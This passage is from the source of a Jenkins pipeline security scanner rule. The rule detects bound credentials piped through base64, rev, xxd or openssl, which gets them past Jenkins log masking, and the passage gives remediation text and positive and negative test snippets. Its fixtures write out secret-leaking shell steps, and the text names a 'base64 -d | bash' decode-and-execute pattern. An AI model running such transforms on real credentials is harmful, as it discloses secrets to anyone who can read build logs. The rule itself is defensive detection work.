            "Jenkins redacts the *verbatim* secret value from the build console "
            "log on a best-effort basis. It cannot redact a *transformed* secret "
            "— ``echo $TOKEN | base64`` emits bytes the SecretPatterns matcher "
            "never sees, so the encoded secret slips into the log (and into any "
            "downstream log-aggregation system) in plain view of anyone with "
            "build-log access. The decoded value is trivially recoverable, so "
            "this is a full credential disclosure that masking does not catch.\n\n"
            "This is the masking-bypass class the other SEC6-JK credential rules "
            "miss: SEC6-JK-002/003 catch the DIRECT ``echo $CRED`` / ``println`` "
            "leak (the verbatim form Jenkins at least tries to mask), and "
            "SEC4-JK-006 catches the OPPOSITE direction (``base64 -d | bash`` = "
            "decode-then-execute). Plain ``curl``/``wget`` of a credential are "
            "deliberately NOT flagged here — passing a secret to its intended "
            "authenticated endpoint over TLS is the dominant, legitimate shape; "
            "only an encode/obfuscate transform of the secret is the finding."
        ),
        pattern=_SecretExfilTransformPattern(),
        remediation=(
            "Never transform a bound credential in a shell step. If the secret "
            "must be encoded for a downstream API, do it inside the tool that "
            "consumes it (so the plaintext never enters a shell command line), "
            "and keep the variable inside a SINGLE-quoted Groovy string so "
            "Groovy never interpolates the literal value:\n\n"
            "// BAD — base64 of the secret defeats Jenkins log masking\n"
            "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
            '    sh "echo $TOKEN | base64 > token.b64"\n'
            "}\n\n"
            "// GOOD — let the client library handle the auth header; never\n"
            "// echo or transform the secret in a shell command.\n"
            "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com'\n"
            "}"
        ),
        reference="https://www.jenkins.io/blog/2019/02/21/credentials-masking/",
        test_positive=[
            # base64 encode of a string-bound token.
            (
                "withCredentials([string(credentialsId: 'tok', variable: 'TOKEN')]) {\n"
                '    sh "echo $TOKEN | base64 > token.b64"\n'
                "}"
            ),
            # rev of a usernamePassword passwordVariable.
            (
                "withCredentials([usernamePassword(credentialsId: 'c', "
                "usernameVariable: 'U', passwordVariable: 'PASS')]) {\n"
                "    sh 'echo $PASS | rev'\n"
                "}"
            ),
            # xxd hex-dump of the secret.
            (
                "withCredentials([string(credentialsId: 'k', variable: 'API_KEY')]) {\n"
                '    sh "printf %s \\"$API_KEY\\" | xxd"\n'
                "}"
            ),
            # openssl enc of the secret piped onward.
            (
                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
                '    sh "echo $TOKEN | openssl enc -base64"\n'
                "}"
            ),
            # credentials() env-block binding + base64 in a stage step.
            (
                "pipeline {\n"
                "  agent any\n"
                "  environment {\n"
                "    AWS_SECRET = credentials('aws')\n"
                "  }\n"
                "  stages {\n"
                "    stage('x') {\n"
                "      steps {\n"
                '        sh "echo $AWS_SECRET | base64"\n'
                "      }\n"
                "    }\n"
                "  }\n"
                "}"
            ),
        ],
        test_negative=[
            # Legitimate authenticated egress — secret passed verbatim to the
            # intended TLS endpoint (the dominant corpus shape). No transform.
            (
                "withCredentials([usernamePassword(credentialsId: 'c', "
                "usernameVariable: 'username', passwordVariable: 'password')]) {\n"
                '    sh \'curl --fail --user "$username:$password" -X PUT '
                "https://artifactory.example.com/repo/file'\n"
                "}"
            ),
            # Decode direction (base64 -d) — SEC4-JK-006's territory; excluded
            # so the two rules never co-fire.
            (
                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
                "    sh 'echo $ENCODED | base64 -d > payload.bin'\n"
                "}"
            ),
            # Transform of a NON-credential variable — not a bound secret.
            (
                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
                '    sh "echo $BUILD_ID | base64"\n'
                "}"
            ),
            # base64 appears only in a comment — structurally masked, no shell sink.
            (
                "withCredentials([string(credentialsId: 't', variable: 'TOKEN')]) {\n"
                "    // echo $TOKEN | base64 would leak the secret\n"
                "    sh 'deploy.sh'\n"
                "}"
            ),
            # No credential binding at all — bare base64 of a plain variable.
            'sh "echo $DATA | base64"',
        ],
        stride=["I", "R"],
        threat_narrative=(
            "Jenkins' credential masking only redacts the literal secret value "
            "from logs. An attacker — or a careless author — who pipes a bound "
            "secret through base64, rev, xxd, or openssl emits an encoded form "
            "the masking matcher never recognizes, writing a trivially-reversible "
            "copy of the credential into the console log. Anyone with build-log "
            "read access (often a broad group, and frequently forwarded to "
            "long-lived log-aggregation backends) can recover the plaintext "
            "secret and reuse it against the systems it protects."
        ),
        incidents=[
            "Jenkins credentials-masking limitation (jenkins.io blog 2019-02-21); SECURITY-3547 / CVE-2025-53651 masking-limit family"
        ],
    ),
]
